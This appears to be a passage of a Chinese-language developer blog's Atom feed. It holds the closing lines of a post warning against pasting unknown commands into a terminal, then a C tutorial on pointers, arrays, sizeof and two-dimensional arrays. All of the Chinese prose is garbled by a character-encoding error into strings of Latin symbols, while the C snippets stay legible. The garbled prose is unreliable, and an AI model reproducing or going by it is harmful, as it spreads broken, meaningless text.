å®Œå…¨æ²’æœ‰æ„Ÿè¦ºã€‚</p><p>æƒ³æƒ³çœ‹ï¼Œå¦‚æœåœ¨é–‹ç™¼è€…çš„éƒ¨è½æ ¼è‡ªæˆ‘ä»‹ç´¹ï¼Œæ”¾å…¥é€™ç¨®æŒ‡ä»¤å¼çš„è‡ªæˆ‘ä»‹ç´¹æ˜¯ä¸æ˜¯å¾ˆæœ‰è¶£ï¼Ÿæˆ–æ˜¯æ”¾åœ¨è‡‰æ›¸çš„è‡ªæˆ‘ä»‹ç´¹ï¼Ÿç•¶ä½ å¾ˆé–‹å¿ƒçš„è²¼ä¸ŠæŒ‡ä»¤æ™‚ï¼Œå¾ˆå¯èƒ½é»˜é»˜ä¸­äº†äººå®¶çš„å¾Œé–€ç¨‹å¼ã€‚</p><h2 id="æœ€å¾Œ"><a href="#æœ€å¾Œ" class="headerlink" title="æœ€å¾Œ"></a>æœ€å¾Œ</h2><p>è©²æ–‡ç« çš„é‡é»ç„¡éé‚„æ˜¯æé†’å¹¾é»è³‡å®‰çš„æ„è­˜ï¼š</p><ul><li>ä¾†è·¯ä¸æ˜çš„æŒ‡ä»¤ä¸è¦è²¼ä¸Šçµ‚ç«¯æ©ŸåŸ·è¡Œ</li><li>ä¸è¦ç›¸ä¿¡å‰ªè²¼æ¿çš„å…§å®¹ï¼ŒæŒ‰ä¸‹ Enter åŸ·è¡Œå‰æ‡‰è©²è‚‰çœ¼å†åº¦æª¢æŸ¥ä¸€æ¬¡æŒ‡ä»¤</li></ul><p>æœ€å¾Œæé†’å¤§å®¶ï¼Œåœ¨æœªç¶“åŒæ„ä¸‹å…¥ä¾µä»–äººé›»è…¦æ˜¯æœ‰åˆ‘è²¬çš„ï¼Œä¸è¦ä»¥èº«è©¦æ³•ï¼</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="è³‡è¨Šå®‰å…¨" scheme="https://blog.yiyu0x.org/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>é‡æ–°çœ‹æ‡‚æŒ‡æ¨™èˆ‡é™£åˆ—ä¹‹é–“çš„äº¤äº’é—œä¿‚</title>
    <link href="https://blog.yiyu0x.org/2020/02/15/"/>
    <id>https://blog.yiyu0x.org/2020/02/15/</id>
    <published>2020-02-15T12:39:00.000Z</published>
    <updated>2025-04-12T20:59:43.596Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>C èªè¨€ä¸­ï¼ŒæŒ‡æ¨™èˆ‡é™£åˆ—ä¹‹é–“çš„é—œä¿‚ä¸€ç›´æ˜¯ä¸€å€‹åˆå­¸è€…å¾ˆé›£ç†è§£çš„å‘ã€‚åˆæˆ–æ˜¯å¾ˆå¤šäººåªçŸ¥é“å¯«æ³•ï¼Œä½†å»å¾ä¾†æ²’æœ‰ç†è§£éèƒŒå¾Œçš„åŸå› ã€‚ç›¸ä¿¡å„ä½ç†è§£äº†åŸå› ä¹‹å¾Œï¼Œåœ¨æ’°å¯« C èªè¨€æ™‚æœƒå°è‡ªå·±æ“ä½œé€™å€‹èªè¨€æ›´åŠ æœ‰è‡ªä¿¡ã€‚é€™ç¯‡æ–‡ç« é‡æ–°è©¦è‘—é‡æ¸…é€™æŒ‡æ¨™èˆ‡é™£åˆ—ä¹‹é–“çš„é—œä¿‚ï¼Œå¸Œæœ›å°å¤§å®¶èƒ½æœ‰å¹«åŠ©ã€‚</p><h2 id="é™£åˆ—å®£å‘Šèˆ‡æŒ‡æ¨™å®£å‘Š"><a href="#é™£åˆ—å®£å‘Šèˆ‡æŒ‡æ¨™å®£å‘Š" class="headerlink" title="é™£åˆ—å®£å‘Šèˆ‡æŒ‡æ¨™å®£å‘Š"></a>é™£åˆ—å®£å‘Šèˆ‡æŒ‡æ¨™å®£å‘Š</h2><p>é™£åˆ—å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼å®£å‘Šï¼š</p><ol><li>å®£å‘Šä½†æ˜¯å°šæœªåˆå§‹åŒ–<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init0[<span class="number">3</span>]; <span class="comment">// å®£å‘Šä½†æ˜¯å°šæœªåˆå§‹åŒ–ï¼Œæ­¤æ™‚é™£åˆ—ä¸­çš„å€¼æ˜¯æ²’æœ‰æ„ç¾©çš„ã€‚</span></span><br></pre></td></tr></tbody></table></figure></li><li>å®£å‘Šä¸¦ä¸”åˆå§‹åŒ–<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init1[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br></pre></td></tr></tbody></table></figure></li><li>ä¸æŒ‡å®šå¤§å°ï¼Œå¤§å°æœƒä¾ç…§å¾Œé¢å…ƒç´ å€‹æ•¸ä¾†æ±ºå®š<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init2[] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br></pre></td></tr></tbody></table></figure></li><li>C99 æ–°å¢ã€‚æŒ‡å®šç‰¹å®šå…ƒç´ ï¼Œå…¶ä»–æœªè¢«æŒ‡å®šå…ƒç´ æœƒè¢«è¨­å®šç‚º 0<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init3[] = {[<span class="number">2</span>] = <span class="number">2</span>};</span><br></pre></td></tr></tbody></table></figure></li></ol><hr><p>æŒ‡æ¨™çš„å®£å‘Šï¼Œéœ€è¦é—œéµå­— <code>*</code>ï¼Œè©²é—œéµå­—å¯ä»¥ç·Šé„°è®Šæ•¸æˆ–æ˜¯å‹æ…‹ï¼Œæœ¬è³ªä¸Šæ²’æœ‰å·®åˆ¥ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* ptr1;</span><br><span class="line"><span class="keyword">int</span> *ptr2;</span><br></pre></td></tr></tbody></table></figure><p>ä½†è‹¥æ˜¯æˆ‘å€‘å®£å‘ŠæŒ‡æ¨™å»ä¸æŒ‡å®šåˆå§‹å€¼ï¼Œé€™ä»¶äº‹æ˜¯éå¸¸å±éšªçš„ï¼</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *ptr1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, ptr1); <span class="comment">// 0x1125ce025</span></span><br></pre></td></tr></tbody></table></figure><p>è©²æŒ‡æ¨™åœ¨æœªå®£å‘Šçš„æƒ…æ³ä¸‹ï¼Œç·¨è­¯å™¨æœƒç›´æ¥æŒ‡å®šè©²ä½ç½®ä¸Šæœ¬ä¾†å°±å­˜æœ‰çš„å€¼ï¼ˆé€™å€‹å€¼æ²’æœ‰æ„ç¾©ï¼Œæ˜¯ä½œæ¥­ç³»çµ±æ®˜ç•™çš„å€¼ï¼‰ï¼Œå¦‚æœæ²’æœ‰ç‰¹åˆ¥æ³¨æ„ï¼Œæ“ä½œé€™å€‹ä½ç½®æœƒç™¼ç”ŸéŒ¯èª¤ï¼Œç”šè‡³è¦†å¯«åˆ°éœ€è¦çš„è³‡æ–™ã€‚</p><p>æˆ‘å€‘æœƒå»ºè­°æŒ‡æ¨™åœ¨å®£å‘Šæ™‚é‚„æ²’æœ‰ç‰¹å®šçš„ç©ºé–“æˆ–ä½ç½®å¯ä»¥æŒ‡å®šæ™‚ï¼Œå…ˆä½¿ç”¨ <code>NULL</code> ä¾†æŒ‡å®šã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, ptr); <span class="comment">//0x0</span></span><br></pre></td></tr></tbody></table></figure><h2 id="é™£åˆ—ç´¢å¼•èˆ‡æŒ‡æ¨™"><a href="#é™£åˆ—ç´¢å¼•èˆ‡æŒ‡æ¨™" class="headerlink" title="é™£åˆ—ç´¢å¼•èˆ‡æŒ‡æ¨™"></a>é™£åˆ—ç´¢å¼•èˆ‡æŒ‡æ¨™</h2><p>é™£åˆ—çš„è®Šæ•¸åç¨±å…¶å¯¦å°±æ˜¯ä¸€å€‹æŒ‡æ¨™ï¼ŒæŒ‡å‘é™£åˆ—é–‹é ­å…ƒç´ çš„è¨˜æ†¶é«”ä½ç½®ã€‚é€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼é™£åˆ—ç´¢å¼•æœƒå¾ 0 é–‹å§‹è¨ˆç®—ï¼Œå› ç‚ºç´¢å¼•çš„æ„ç¾©å…¶å¯¦æ˜¯èˆ‡èµ·å§‹ä½ç½®çš„ä½ç§»é‡ã€‚æˆ‘å€‘å¯ä»¥ç”¨ä»¥ä¸‹ç¯„ä¾‹çœ‹åˆ°èµ·å§‹ä½ç½®çš„å€¼å°±æ˜¯ç›´æ¥å°é™£åˆ—åç¨±å–å€¼ï¼ˆdereferenceï¼‰ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Address: %p, Value: %d\n"</span>, arr, *arr);</span><br><span class="line"><span class="comment">// Address: 0x7ffee98be05c, Value: 1</span></span><br></pre></td></tr></tbody></table></figure><p>å¦‚æœå°è©²è®Šæ•¸éå¢ï¼Œæœƒç™¼ç¾è¨˜æ†¶é«”ä½ç½®ç›¸å·®äº† 4 æ ¼ï¼ŒåŸå› æ˜¯å› ç‚ºæˆ‘å€‘åœ¨å®£å‘Šé™£åˆ—æ™‚ï¼ŒæŒ‡å®šäº†é™£åˆ—çš„å‹æ…‹æ˜¯ <code>int</code>ï¼Œå¦‚æ­¤ä»¥ä¾†æˆ‘å€‘åœ¨é€²è¡Œå–å€¼çš„å‹•ä½œæ™‚ï¼ŒCPU æ‰çŸ¥é“ä¸‹ä¸€å€‹ä½ç½®åœ¨å“ªé‚Šã€‚æœ‰è¶£çš„æ˜¯ï¼Œä¸€èˆ¬æˆ‘å€‘æ‰€ä½¿ç”¨çš„å–å€¼å‹•ä½œ <code>arr[1]</code> å…¶å¯¦å°±ç­‰æ–¼ <code>*(arr + 1)</code>ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Address: %p, Value: %d\n"</span>, arr + <span class="number">1</span>, *(arr + <span class="number">1</span>));</span><br><span class="line"><span class="comment">// Address: 0x7ffee1dca060, Value: 2</span></span><br></pre></td></tr></tbody></table></figure><p>æœ‰äº†ä»¥ä¸Šçš„æ¦‚å¿µä¹‹å¾Œï¼Œä¸é›£ç†è§£ç‚ºä½•æˆ‘å€‘åœ¨è¨­å®šå‡½æ•¸çš„åƒæ•¸å¼•è¿°æ™‚ï¼Œå¯ä»¥å°‡é™£åˆ—è¨­å®šç‚ºï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *arr)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>æˆ–æ˜¯é€™æ¨£è¨­å®šï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>é€™å…©ç¨®æŒ‡å®šæ–¹å¼æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼ˆå°æ–¼ç·¨è­¯å™¨ä¾†èªªï¼‰ã€‚åœ¨å‡½å¼åŸå‹ä¸­ï¼Œåƒæ•¸çš„åç¨±æ˜¯æ²’æœ‰æ„ç¾©çš„ï¼Œåªæœ‰å‹æ…‹æœ‰æ„ç¾©ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æŒ‡å®šç‚ºï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>ä½†æ˜¯é™£åˆ—åç¨±èˆ‡æŒ‡æ¨™ä¹Ÿä¸èƒ½èªªæ˜¯å®Œå…¨ä¸€æ¨¡ä¸€æ¨£çš„æ±è¥¿ã€‚</p><h2 id="é™£åˆ—å‚³éèˆ‡æŒ‡æ¨™"><a href="#é™£åˆ—å‚³éèˆ‡æŒ‡æ¨™" class="headerlink" title="é™£åˆ—å‚³éèˆ‡æŒ‡æ¨™"></a>é™£åˆ—å‚³éèˆ‡æŒ‡æ¨™</h2><p>åœ¨ C èªè¨€ä¸­ï¼Œå‚³éé™£åˆ—å°±æ˜¯å‚³éé™£åˆ—çš„èµ·å§‹è¨˜æ†¶é«”ä½ç½®ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç”¨æŒ‡æ¨™ä¾†æ¥æ”¶é™£åˆ—ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string"><stdio.h></span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span> arr); <span class="comment">// 12</span></span><br><span class="line">    foo(arr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *ar)</span> </span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span> ar); <span class="comment">// 8</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>ä»¥ä¸Šç¨‹å¼æœƒå°å‡ºï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">8</span><br></pre></td></tr></tbody></table></figure><p>å…ˆå°å‡º 12 çš„åŸå› æ˜¯ï¼Œé™£åˆ—åœ¨å®£å‘Šæ™‚å°±å·²ç¶“çŸ¥é“äº†é™£åˆ—é•·åº¦ï¼Œint å‹æ…‹åœ¨æˆ‘çš„ä½œæ¥­ç³»çµ±ä¸­ä½”ç”¨äº† 4 bytesï¼Œæ‰€ä»¥ 4x3=12ã€‚</p><p>8 çš„è©±å‰‡æ˜¯ä»£è¡¨æŒ‡æ¨™è®Šæ•¸æœ¬èº«ä½”æ“šäº† 8 bytes çš„ç©ºé–“ã€‚éå¸¸åˆç†ï¼Œå› ç‚ºæˆ‘çš„é›»è…¦æ˜¯ 64-bit çš„ä½œæ¥­ç³»çµ±ï¼Œè¦å¯ä»¥å®Œæ•´å®šå€å…¨éƒ¨ç©ºé–“éœ€è¦ 8 bytesï¼ˆ64 / 8 = 8ï¼‰ã€‚</p><p>æ‰€ä»¥ç‚ºä»€éº¼å‰›æ‰æåˆ°ï¼šã€Œé™£åˆ—åç¨±èˆ‡æŒ‡æ¨™ä¹Ÿä¸èƒ½èªªæ˜¯å®Œå…¨ä¸€æ¨¡ä¸€æ¨£çš„æ±è¥¿ã€ã€‚ç”¨ <code>sizeof</code> é€²è¡Œæ“ä½œæ™‚ï¼Œæœƒç™¼ç¾å…©è€…é‚„æ˜¯æœ‰ä¸€é»å·®åˆ¥ï¼ï¼ˆä¸éåœ¨æ²’æœ‰é€²è¡Œåƒæ•¸å‚³éå‰ï¼Œå¹¾ä¹æ˜¯æ²’æœ‰å·®åˆ¥çš„ã€‚ï¼‰</p><p>ç”±ä»¥ä¸Šçš„ä¾‹å­å¯ä»¥ç™¼ç¾ï¼Œé™£åˆ—çš„è®Šæ•¸åç¨±å¯ä»¥é€²ä¸€æ­¥å¾—çŸ¥é™£åˆ—é•·åº¦çš„ï¼Œåªè¦ä½¿ç”¨ <code>sizeof</code> é‹ç®—å­å³å¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">sizeof</span> arr / <span class="keyword">sizeof</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, len); <span class="comment">//3</span></span><br></pre></td></tr></tbody></table></figure><p><code>sizeof</code> å¾Œé¢å¦‚æœä¸æ˜¯æ¥åŸºæœ¬å‹æ…‹ï¼Œæ˜¯ä¸éœ€è¦æ‹¬è™Ÿçš„ã€‚å¦‚æœæ¥ä¸ŠåŸºæœ¬å‹æ…‹æ‰éœ€è¦æ‹¬è™Ÿï¼Œåƒæ˜¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));   <span class="comment">//1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">short</span>));  <span class="comment">//2</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));    <span class="comment">//4</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));   <span class="comment">//8</span></span><br><span class="line"><span class="comment">//è«‹æ³¨æ„ï¼ä¸åŒå‹æ…‹çš„ç©ºé–“å¤§å°æ˜¯ç”±ç·¨è­¯å™¨ä¾ç…§ä½œæ¥­ç³»çµ±å»åˆ†é…ä»¥åŠå¯¦ä½œï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¸åŒé›»è…¦ä¸Šé¢çš„çµæœä¸ä¸€è‡´ã€‚</span></span><br></pre></td></tr></tbody></table></figure><p>å°æ–¼å‡½å¼ä¾†èªªï¼Œå®ƒåªæœ‰è¾¦æ³•å¾—çŸ¥é™£åˆ—èµ·å§‹è¨˜æ†¶é«”ä½ç½®ï¼Œç„¡æ³•å¾—çŸ¥ç¸½é•·åº¦ã€‚æˆ–æ˜¯å¯ä»¥ç›´æ¥èªªï¼Œå°æ–¼å‡½æ•¸ä¾†èªªï¼Œä»–ä¸¦ä¸çŸ¥é“å‚³é€²ä¾†çš„æ±è¥¿æ˜¯ä¸€å€‹é™£åˆ—ï¼ŒåªçŸ¥é“æ˜¯ä¸€å€‹è¨˜æ†¶é«”ä½ç½®ï¼ŒæŒ‡å‘çš„å‹æ…‹ä¹ŸçŸ¥é“ï¼Œå…¶ä»–äº‹æƒ…å°æ–¼é€™å€‹å‡½æ•¸ä¾†èªªéƒ½ç„¡æ³•å¾—çŸ¥ã€‚</p><p>é€™ä¹Ÿæ˜¯ç‚ºä½•æˆ‘å€‘æ™‚å¸¸åœ¨æ¥æ”¶é™£åˆ—æ™‚ï¼Œæœƒé¡å¤–æ¥æ”¶ä¸€å€‹åƒæ•¸ï¼Œç”¨ä¾†è¡¨ç¤ºé™£åˆ—çš„ç¸½é•·åº¦ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">int</span> n)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="äºŒç¶­é™£åˆ—"><a href="#äºŒç¶­é™£åˆ—" class="headerlink" title="äºŒç¶­é™£åˆ—"></a>äºŒç¶­é™£åˆ—</h2><p>åœ¨å®£å‘Šä¸€ç¶­é™£åˆ—æ™‚ï¼Œå¯ä»¥ç›´æ¥å¡«ä¸Šå…ƒç´ ï¼Œä¸æŒ‡å®šé™£åˆ—å¤§å°ï¼Œå¯æ˜¯åœ¨äºŒç¶­é™£åˆ—é€™æ¨£æ“ä½œçš„è©±ï¼Œæœƒç™¼ç”ŸéŒ¯èª¤ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> td_arr[][] = {{<span class="number">1</span>, <span class="number">2</span>}, {<span class="number">3</span>, <span class="number">4</span>}, {<span class="number">5</span>, <span class="number">6</span>}};</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">app.c:7:12: error: array has incomplete element type 'int []'</span></span><br><span class="line"><span class="comment">        int td_arr[][] = {{1, 2}, {3, 4}, {5, 6}};</span></span><br><span class="line"><span class="comment">                  ^</span></span><br><span class="line"><span class="comment">1 error generated.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></tbody></table></figure><p>æˆ‘å€‘è¦å…ˆé‡æ–°ç†è§£äºŒç¶­é™£åˆ—ï¼ŒäºŒç¶­é™£åˆ—ä¸éæ˜¯ä¸€å€‹é™£åˆ—ï¼Œè©²é™£åˆ—çš„å€¼ä¹Ÿæ˜¯ä¸€å€‹é™£åˆ—ï¼ˆ<code>{1, 2}</code>, <code>{3, 4}</code>, <code>{5, 6}</code>ï¼‰ï¼Œæ²’æœ‰å¤šç‰¹åˆ¥ï¼Œåƒ…æ­¤è€Œå·²ã€‚</p><p>é™£åˆ—åªæ¥å—ç¬¬ä¸€å±¤ä¸æŒ‡å®šå¤§å°è€Œå·²ï¼Œç”¨å¾Œé¢çš„å…ƒç´ å€‹æ•¸è‡ªå·±æ¨ç®—ï¼ˆä¸€ç¶­é™£åˆ—åªæœ‰ä¸€å±¤ï¼Œæ‰€ä»¥ä½ å¯èƒ½æœƒèªç‚ºä¸€ç¶­é™£åˆ—æ¯”è¼ƒè°æ˜ï¼‰ã€‚</p><p>æ‰€ä»¥æˆ‘å€‘æ‡‰è©²è¦å‘Šè¨´ç·¨è­¯å™¨ï¼Œå…§å±¤é™£åˆ—çš„å¤§å°ï¼Œé€™æ¨£ä»–æ‰æœ‰è¾¦æ³•å¹«æˆ‘å€‘å°‡æ‰€éœ€è¦çš„ç©ºé–“æº–å‚™å¥½ï¼Œæˆ‘å€‘æ‡‰è©²é€™æ¨£å­æ’°å¯«ç¨‹å¼ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> td_arr[][<span class="number">2</span>] = {{<span class="number">1</span>, <span class="number">2</span>}, {<span class="number">3</span>, <span class="number">4</span>}, {<span class="number">5</span>, <span class="number">6</span>}};</span><br></pre></td></tr></tbody></table></figure><p>ç¬¬ä¸€å±¤æœ‰å¹¾å€‹å…ƒç´ å¯ä»¥ä¸ç”¨æŒ‡å®šï¼ˆå°±åƒä¸€ç¶­é™£åˆ—ï¼‰ï¼Œä½†æ˜¯æˆ‘å€‘éœ€è¦å‘Šè¨´ç·¨è­¯å™¨ï¼Œå…§å®¹é™£åˆ—çš„å¯¬åº¦æœ‰å¤šå¤§ã€‚æˆ‘å€‘ç¸½å…±èŠ±äº† 24 bytes çš„ç©ºé–“ï¼Œ4 bytes(int size) x 6(elements) = 24ã€‚</p><p>æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å˜—è©¦å°‡äºŒç¶­é™£åˆ—ä¸­æˆ‘å€‘éœ€è¦çš„å€¼å–å‡ºï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *td_arr[<span class="number">1</span>]);  <span class="comment">//3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (*td_arr)[<span class="number">1</span>]);<span class="comment">//2</span></span><br></pre></td></tr></tbody></table></figure><p><code>[]</code> çš„å„ªå…ˆæ¬Šæ¯” <code>*</code> é‚„è¦é«˜ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€å€‹ç¯„ä¾‹ä¸­æˆ‘å€‘æœƒå…ˆæ‰¾åˆ° <code>td_arr</code> ä¸­çš„ç¬¬äºŒå€‹å…ƒç´ ï¼ˆç¬¬ 1 å€‹æ˜¯ç´¢å¼• 0ï¼‰ç„¶å¾Œå–å€¼ã€‚ç¬¬äºŒå€‹å…ƒç´ å°±æ˜¯ <code>{3, 4}</code>ï¼Œåœ¨æ–‡ç« å‰æ®µçš„ä¸€ç¶­é™£åˆ—æœ‰è¬›éç›´æ¥å–å€¼å°±æ˜¯å°ç¬¬ä¸€å€‹å…ƒç´ ï¼ˆç´¢å¼• 0ï¼‰å–å€¼ã€‚æ‰€ä»¥ <code>{3, 4}</code> çš„ç¬¬ä¸€å€‹å…ƒç´ å°±æ˜¯ <code>3</code>ã€‚</p><p>ç¬¬äºŒå€‹ç¯„ä¾‹å‰‡æ˜¯å…ˆå–å€¼ï¼Œæˆ‘å€‘æœƒæ‹¿åˆ° <code>td_arr</code> çš„ç¬¬ 1 å€‹å…ƒç´ ï¼ˆç´¢å¼• 0ï¼‰ï¼Œä¹Ÿå°±æ˜¯ <code>{1, 2}</code> æ¥ä¸‹ä¾†å–å‡ºç¬¬äºŒå€‹å…ƒç´ ï¼ˆç´¢å¼• 1ï¼‰ï¼Œå¾—åˆ° <code>2</code>ã€‚</p><p>ä¹Ÿå¯ä»¥å°‡ä¸Šè¿°å¯«æˆæ˜¯ä¸å«æœ‰ <code>[]</code> çš„è¡¨ç¤ºæ³•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, **(td_arr + <span class="number">1</span>));<span class="comment">//3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *(*td_arr + <span class="number">1</span>));<span class="comment">//2</span></span><br></pre></td></tr></tbody></table></figure><p>å‰é¢æ®µè½ä¹Ÿæœ‰æåˆ° <code>[]</code> èˆ‡ <code>*(arr + offset)</code> çš„å¯«æ³•å¯ä»¥äº’ç›¸æ›¿æ›ï¼Œå°±ä¸å†è´…è¿°ã€‚</p><h2 id="æŒ‡æ¨™èˆ‡äºŒç¶­é™£åˆ—"><a href="#æŒ‡æ¨™èˆ‡äºŒç¶­é™£åˆ—" class="headerlink" title="æŒ‡æ¨™èˆ‡äºŒç¶­é™£åˆ—"></a>æŒ‡æ¨™èˆ‡äºŒç¶­é™£åˆ—</h2><p>æ¥ä¸‹ä¾†æˆ‘å€‘è¦ç†è§£å¦‚ä½•ç”¨æŒ‡æ¨™å»æ“ä½œäºŒç¶­é™£åˆ—ï¼Œé¦–å…ˆæˆ‘å€‘éœ€è¦å…ˆå®£å‘Šä¸€å€‹æŒ‡å‘äºŒç¶­é™£åˆ—çš„æŒ‡æ¨™ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (*td_ptr)[<span class="number">2</span>];</span><br></pre></td></tr></tbody></table></figure><p>è©²å®£å‘Šçš„æ„æ€æ˜¯å®£å‘Šä¸€å€‹æŒ‡æ¨™ï¼ŒæŒ‡å‘å¤§å°ç‚º 2 çš„é™£åˆ—ï¼Œè©²é™£åˆ—å…§å®¹ç‚º <code>int</code> 